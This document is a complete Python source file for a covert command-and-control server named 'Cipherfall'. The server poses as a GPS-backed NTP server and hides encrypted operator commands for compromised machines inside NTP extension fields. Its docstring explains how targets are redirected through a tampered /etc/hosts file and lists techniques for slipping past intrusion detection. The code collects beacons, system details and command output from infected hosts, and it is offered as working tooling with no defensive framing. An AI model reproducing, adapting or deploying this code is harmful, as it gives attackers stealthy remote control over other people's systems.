#!/usr/bin/env python3
"""
server.py — Cipherfall NTP C2 Server (fallback channel)

Binds UDP/123 to act as a fake NTP server. Agents reach it by resolving their
distro's default NTP domain (e.g. ntp.ubuntu.com) which has been redirected to
this server's IP via /etc/hosts compromise on the target.

Architecture:
  Two concurrent asyncio tasks share the same event loop:
    1. NTP UDP server  — listens on 0.0.0.0:123, processes agent beacons and
                         injects encrypted commands into NTP responses.
    2. Admin HTTP API  — FastAPI on 127.0.0.1:1338 (localhost only), same
                         interface as the main C2 server so operator_cli.py
                         and tui.py work against both channels unchanged.

NTP packet handling:
  Inbound (Mode 3, client request):
    The 48-byte NTP header is validated (LI/VN/Mode). If an NTS Cookie
    extension field (type 0x0104) is present its value is decrypted; the
    plaintext JSON carries the agent heartbeat and optionally a task result
    from the previous beacon cycle.
  Outbound (Mode 4, server response):
    A well-formed NTP server header is built with Stratum=1, plausible
    timestamps and a GPS Reference ID. If a task is pending for the beaconing
    agent the encrypted command is placed in an NTS Cookie extension field.
    When no task is pending the response is a clean 48-byte packet with no
    extension field, indistinguishable from a legitimate NTP reply.

Encryption:
  AES-256-GCM via pycryptodome (server side).
  Key = PBKDF2-SHA256(PSK, b"cipherfall_c2_v1", 32 bytes, 100 000 iterations).
  Wire: raw binary nonce(12) + ciphertext + GCM-tag(16) in extension field value.

IDS evasion:
  - Extension field type 0x0104 (NTS Cookie) is a standard RFC 8915 type;
    its value is supposed to be opaque encrypted data — no IDS flags it.
  - Response size is kept small: 48 bytes when no task, 48 + extension
    (~command size + 28 bytes overhead) when task present. The amplification-
    detection threshold (response >> request) is never exceeded because both
    request and response carry the same extension field overhead.
  - Server claims Stratum 1 with Reference ID "GPS\x00" — maximally credible.
  - Timestamps in the response are derived from the client's Transmit Timestamp
    to produce a realistic round-trip pattern.
  - Server does NOT log to stdout during normal operation to avoid shell noise;
    use C2_DEBUG=1 to enable per-packet logging.

Admin API (127.0.0.1:1338, same routes as main C2):
  GET  /admin/agents            list agents seen via NTP beacons
  GET  /admin/tasks             list all tasks
  POST /admin/task              queue task  {agent_id, command}
  GET  /admin/result/<task_id>  retrieve output

Task lifecycle:
  pending  → task queued by operator
  sent     → task included in an NTP response (agent may not have executed yet)
  done     → result received in a subsequent beacon

Environment variables:
  C2_PSK       pre-shared passphrase             (default: changeme)
  C2_DB        SQLite database path              (default: ntp_c2.db)
  C2_ADMIN     admin HTTP port                   (default: 1338)
  C2_DEBUG     set to 1 for per-packet logging   (default: off)

Requirements:
  pip install fastapi uvicorn[standard] pycryptodome python-dotenv

Limitations:
  - Requires root (or CAP_NET_BIND_SERVICE) to bind UDP/123.
    Use: sudo python3 server.py  or  sudo setcap cap_net_bind_service+ep python3
  - Only one pending task per agent at a time (later POST overwrites earlier).
  - SQLite serialises concurrent writes; not suitable for large deployments.
  - UDP is connectionless; lost responses require the operator to re-queue.
  - Output truncated at MAX_OUTPUT bytes on the agent side (see agent.py).
"""

import asyncio, hashlib, json, os, sqlite3, time, uuid
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request
import uvicorn
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import struct

load_dotenv()

PSK        = os.environ.get("C2_PSK",   "changeme")
DB_PATH    = os.environ.get("C2_DB",    "ntp_c2.db")
ADMIN_PORT = int(os.environ.get("C2_ADMIN", "1338"))
DEBUG      = os.environ.get("C2_DEBUG", "") == "1"

_NTP_DELTA = 2208988800
_EXT_TYPE  = 0x0104

_KEY = PBKDF2(PSK.encode(), b"cipherfall_c2_v1", dkLen=32,
               count=100_000, hmac_hash_module=SHA256)


def _encrypt(obj):
    nonce  = get_random_bytes(12)
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
    return nonce + ct + tag


def _decrypt(blob):
    nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return json.loads(cipher.decrypt_and_verify(ct, tag))


def _ntp_ts(t=None):
    t   = t or time.time()
    ntp = t + _NTP_DELTA
    return (int(ntp) << 32) | int((ntp % 1) * 2**32)


def _parse_request(data):
    if len(data) < 48:
        return None, None
    li_vn_mode = data[0]
    mode = li_vn_mode & 0x07
    if mode != 3:
        return None, None
    client_tx_ts = struct.unpack("!Q", data[40:48])[0]
    payload = None
    pos = 48
    while pos + 4 <= len(data):
        ftype, flen = struct.unpack("!HH", data[pos:pos+4])
        if flen < 4 or pos + flen > len(data):
            break
        if ftype == _EXT_TYPE and flen > 4 + 2 + 28:
            raw      = data[pos+4 : pos+flen]
            blob_len = struct.unpack("!H", raw[:2])[0]
            blob     = raw[2 : 2 + blob_len]
            try:
                payload = _decrypt(blob)
            except Exception:
                pass
        pos += flen
    return client_tx_ts, payload


def _build_response(client_tx_ts, cmd_payload=None):
    now     = time.time()
    recv_ts = _ntp_ts(now)
    tx_ts   = _ntp_ts(now + 0.000_050)

    hdr = struct.pack(
        "!BBBb II 4s QQQQ",
        0x24,
        1,
        6,
        -20,
        0x00000000,
        0x00000000,
        b"GPS\x00",
        _ntp_ts(now - 0.001),
        client_tx_ts,
        recv_ts,
        tx_ts,
    )

    if not cmd_payload:
        return hdr

    framed = struct.pack("!H", len(cmd_payload)) + cmd_payload
    padded = framed + b'\x00' * (-len(framed) % 4)
    flen   = 4 + len(padded)
    ext    = struct.pack("!HH", _EXT_TYPE, flen) + padded
    return hdr + ext


def _db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con


def _init_db():
    with _db() as con:
        con.executescript("""
            CREATE TABLE IF NOT EXISTS agents (
                id         TEXT PRIMARY KEY,
                label      TEXT,
                first_seen INTEGER NOT NULL,
                last_seen  INTEGER NOT NULL,
                sysinfo    TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id         TEXT PRIMARY KEY,
                agent_id   TEXT NOT NULL,
                command    TEXT NOT NULL,
                status     TEXT NOT NULL DEFAULT 'pending',
                created_at INTEGER NOT NULL,
                output     TEXT
            );
        """)


def _handle_beacon(msg):
    agent_id = msg.get("id", "")
    if not agent_id:
        return

    now     = int(time.time())
    sysinfo = msg.get("sysinfo", {})

    with _db() as con:
        con.execute(
            "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
            " VALUES (?,?,?,?,?)",
            (agent_id, sysinfo.get("hostname", agent_id[:8]), now, now, "{}")
        )
        con.execute(
            "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
            (now, json.dumps(sysinfo), agent_id)
        )

    result = msg.get("result")
    if result:
        task_id = result.get("task_id", "")
        output  = result.get("output", "")
        with _db() as con:
            con.execute(
                "UPDATE tasks SET status='done', output=? WHERE id=?",
                (output, task_id)
            )

    if DEBUG:
        print(f"[ntp] beacon  agent={agent_id[:8]}  host={sysinfo.get('hostname','?')}")


def _pop_pending_task(agent_id):
    with _db() as con:
        row = con.execute(
            "SELECT id, command FROM tasks WHERE agent_id=? AND status='pending'"
            " ORDER BY created_at LIMIT 1",
            (agent_id,)
        ).fetchone()
        if not row:
            return None, None
        con.execute("UPDATE tasks SET status='sent' WHERE id=?", (row["id"],))
    return row["id"], row["command"]


class _NTPProtocol(asyncio.DatagramProtocol):
    def __init__(self):
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        client_tx_ts, msg = _parse_request(data)
        if client_tx_ts is None:
            return

        cmd_blob = None

        if msg:
            agent_id = msg.get("id", "")
            _handle_beacon(msg)
            task_id, command = _pop_pending_task(agent_id)
            if task_id:
                cmd_blob = _encrypt({"task_id": task_id, "cmd": command})
                if DEBUG:
                    print(f"[ntp] dispatch task={task_id[:8]}  agent={agent_id[:8]}")

        response = _build_response(client_tx_ts, cmd_blob)
        self.transport.sendto(response, addr)

    def error_received(self, exc):
        pass


admin = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)


@admin.get("/admin/agents")
async def list_agents():
    with _db() as con:
        rows = con.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return [dict(r) for r in rows]


@admin.get("/admin/tasks")
async def list_tasks():
    with _db() as con:
        rows = con.execute("SELECT * FROM tasks ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]


@admin.post("/admin/task")
async def create_task(request: Request):
    body    = await request.json()
    agent_id = body.get("agent_id")
    command  = body.get("command")
    if not agent_id or not command:
        raise HTTPException(status_code=400)
    task_id = str(uuid.uuid4())
    with _db() as con:
        con.execute(
            "INSERT INTO tasks VALUES (?,?,?,'pending',?,NULL)",
            (task_id, agent_id, command, int(time.time()))
        )
    return {"task_id": task_id}


@admin.get("/admin/result/{task_id}")
async def get_result(task_id: str):
    with _db() as con:
        row = con.execute("SELECT * FROM tasks WHERE id=?", (task_id,)).fetchone()
    if not row:
        raise HTTPException(status_code=404)
    return dict(row)


async def _main():
    import socket as _socket
    loop = asyncio.get_running_loop()
    transport, _ = await loop.create_datagram_endpoint(
        _NTPProtocol,
        local_addr=("0.0.0.0", 123),
        family=_socket.AF_INET,
    )
    print(f"[*] NTP C2 listening on UDP/123")
    print(f"[*] Admin API on http://127.0.0.1:{ADMIN_PORT}")

    cfg = uvicorn.Config(admin, host="127.0.0.1", port=ADMIN_PORT, log_level="error")
    srv = uvicorn.Server(cfg)
    srv.install_signal_handlers = lambda: None
    try:
        await srv.serve()
    finally:
        transport.close()


if __name__ == "__main__":
    _init_db()
    asyncio.run(_main())
